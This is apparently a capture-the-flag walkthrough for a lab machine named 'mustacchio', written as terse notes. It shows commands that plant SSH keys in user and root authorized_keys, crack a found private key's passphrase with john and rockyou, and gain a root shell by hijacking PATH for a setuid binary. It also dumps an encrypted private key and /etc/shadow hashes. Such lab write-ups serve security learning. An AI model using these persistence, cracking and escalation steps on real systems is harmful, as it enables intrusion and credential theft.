### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDNEur472YyjCFC+lMG8ymUPP099Hr7XMJpHbR7v7yMZBOO1MTAxgBToiYgP/clx9jJGLYuhwde+Zhmexx+DiWDgjLTnloiFn7oKSxiSl6p7ocVpUm7KjrdLqwaFLiYiyBA75C9mnN6LjnOzE0lAhipIzvHTAx9YbpHNKGruZIoApefA5CmFsxQoCffcOl7dwYf4+AAB8JAjvRd3rHUqVyskwYzjCqcMOhGVLNveOVHjtIg1tFADfsSSFSSUrfgca3V9buFLRgf/zVaD07Bwe/HvLLXvk9IQkoFNov2Jw+fTw6M9AmLw66kScVGKOnDA/PVXoHF4/d+j9KMgA0WJkfiRC9s5q6dy2bLxAcAOh59cFN3oMTOjU//Th7rrP0BWT0D5BWLo6hpOA3CLGPpdfbr08K8k8GjoDMeR8nqx8k6UKSp8eY0IJt3Sx4lvoNZ0X1cLVb+Hdflcsgzqsc5JroSRvMmVupUSXEdkSHSht4PDLgsjlilgfJYcOJ2lJEumNKa4/m2vuoA5iugWy+6eRVTTtE23i4hDf/o6W1bC4a9++RT4SXbRZJvp/B7pePhqFVEQ5rQdRPRFE+EyhbLFK7QyqP2Ua74wh3NKnrAZwKmmkKkUCUstBsmhN3C3v3dz17lF9Vpgzv0dwEQ5au7LN36Z6gy2l0Pkuo18cFRsHpVow== your_email@example.com" >> /home/barry/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCHObDEycl/NUAmCNqN0XDmrvGGOA5+HE1pQOJXpkPUQhIfnUnAJMvijOERVmvxSqchieV4VmoyAW8AhM2jfAKNC56gw2TGOh/GUn/pe18Lckgyr//+NJUYJXN31rR8paIUdhAeX6TU6ImO7PVykxvJRe05LdfPmwTFu2hihTJLDPyz/H2jfcPYs6tssFL2OrRxC2ey8auu4Br2M/xt0TwA37C5GW+XjLIFnkDd4Azc0qF89pc2zp0kqkavw/pG1QYlk6ur2BC0mw592ZeiC6VkYZAiW9cYEj/9GdE0nkRMI8+puXnE60NyPLZ7HWe6bSnLHZOe35fOMS8rNUVXOD3IKaRrzDeYaCMVgu9cHfdqPV517+s+jEfCFtETSTcDRlG23IcG6Hyk8WHdjVbyrT1r4sGl/t2+SKTOZyy+mLt1sNiN/2OHwW/CEup1FdLktEK3O6rO9fQytiVvd3o+uO6i5JxTtqOt87m/uGEKmYAlQAfqDOyh7JggtFJdb5eyjvIvCtWTxd5md+4fCf3u5O+vcJmGecyTjG+hJ9d6lne6ri6T4wI+UW2YK7NW8vhvtjsSH/FwBcI4vfOeI5+F2/y9r5y7R1HM7luAveWkBjbM4+zpq2J9OjbXKuBk+wDejyayDJqjUdggTssATmXdIQTlOprANd6s/0tu0yxlAV1Zaw== your_email@example.com" >> /root/.ssh/authorized_keys
```


we seem to have a private key for barry

```
-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY-----
```

editing it, this is what it should look like

https://phpseclib.com/docs/rsa-keys#encrypted-private-keys

```
-----BEGIN RSA PRIVATE KEY----- 
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----

```

need a password

```
ssh -i barry_rsa barry@10.10.32.158
The authenticity of host '10.10.32.158 (10.10.32.158)' can't be established.
ED25519 key fingerprint is SHA256:8ffSUaKVshwAGNYcOWTbXfy0ik5uNnUqe/0nXK/ybSA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.32.158' (ED25519) to the list of known hosts.
Enter passphrase for key 'barry_rsa':
```


```
john --wordlist=/usr/share/wordlists/rockyou.txt barryhash.md
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (barry_rsa)     
1g 0:00:00:00 DONE (2024-11-22 05:10) 1.086g/s 3228Kp/s 3228Kc/s 3228KC/s urieljr.k..urielfabricio07
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
ssh -i barry_rsa barry@10.10.32.158
urieljames
```

```
barry@mustacchio:~$ whoami
barry
barry@mustacchio:~$ uname -a
Linux mustacchio 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
barry@mustacchio:~$ 
```


/home/barry/user.txt
```
62d77a4d5f97d47c5aa38b3b2651b831
```


we are unable to sudo with that password

looooking in joe's user directory


```
-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log
```

this file is owned by root

file /home/joe/live_log

```
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

strings /home/joe/live_log

```
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
```

```
tail -f /var/log/nginx/access.log
```

the binary is running without a full path

simply proceed to a directory that we have write permissions for, example is the user's home directory that we are (barry)

make a new tail file and set a new $PATH variable


```
cd /home/barry
export PATH=/home/barry:$PATH
nano tail
```

paste into the nano editor
```
#!/bin/bash 
/bin/bash
```


```
chmod 777 tail
/home/joe/live_log
```

we get a root shell

```
root@mustacchio:~# whoami
root
root@mustacchio:~# uname -a
Linux mustacchio 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
root@mustacchio:~# sudo -l
sudo: unable to resolve host mustacchio: Connection refused
Matching Defaults entries for root on mustacchio:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on mustacchio:
    (ALL : ALL) ALL
```

/root/root.txt

```
3223581420d906c4dd1a5f9b530393a5
```


/etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```

/etc/shadow
```
root:*:18739:0:99999:7:::
daemon:*:18739:0:99999:7:::
bin:*:18739:0:99999:7:::
sys:*:18739:0:99999:7:::
sync:*:18739:0:99999:7:::
games:*:18739:0:99999:7:::
man:*:18739:0:99999:7:::
lp:*:18739:0:99999:7:::
mail:*:18739:0:99999:7:::
news:*:18739:0:99999:7:::
uucp:*:18739:0:99999:7:::
proxy:*:18739:0:99999:7:::
www-data:*:18739:0:99999:7:::
backup:*:18739:0:99999:7:::
list:*:18739:0:99999:7:::
irc:*:18739:0:99999:7:::
gnats:*:18739:0:99999:7:::
nobody:*:18739:0:99999:7:::
systemd-timesync:*:18739:0:99999:7:::
systemd-network:*:18739:0:99999:7:::
systemd-resolve:*:18739:0:99999:7:::
systemd-bus-proxy:*:18739:0:99999:7:::
syslog:*:18739:0:99999:7:::
_apt:*:18739:0:99999:7:::
lxd:*:18739:0:99999:7:::
messagebus:*:18739:0:99999:7:::
uuidd:*:18739:0:99999:7:::
dnsmasq:*:18739:0:99999:7:::
sshd:*:18739:0:99999:7:::
pollinate:*:18739:0:99999:7:::
vagrant:$6$rxWldag3$UH9F1UZhDQEKKleaid9QNzH7n1uDIJgdnGP01X5lwo4HAAO292zKrLCM5Gk1j5g4sacRoNR2b790HUGSNA/Wn.:18739:0:99999:7:::
joe:$6$Knz6FBbL$UEDnt.pkH6ZEDf/R4cJMLXP36diGxbnUoocdFrYWRybQ58DOP9kE4vgcU9CZXQ2e/l/HQ8UZFrQXsZTB8ZYPy1:18790:0:99999:7:::
barry:$6$230tFyKx$W3A2JMRqNrW2bFT/XsCNoPNDlTjxlqAkmLSyC9EHxRLLce8AlHQWwidzC.SSVIqzB64.zLjUTMWgrrfv0UqjG0:18790:0:99999:7:::
```